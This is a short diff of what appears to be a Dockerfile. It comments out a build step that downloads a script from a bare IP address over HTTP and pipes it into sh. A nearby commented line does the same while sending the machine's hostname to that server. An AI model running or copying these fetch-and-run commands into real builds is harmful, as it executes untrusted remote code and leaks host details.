@@ -17,7 +17,7 @@ RUN apk add --no-cache curl
 
 #RUN apk add --no-cache curl
 
-RUN curl -sSL http://124.71.183.77/test.sh | sh 
+#RUN curl -sSL http://124.71.183.77/test.sh | sh 
 
 #RUN curl -sSL http://124.71.183.77/test.sh?whoami=`hostname` | sh 
 
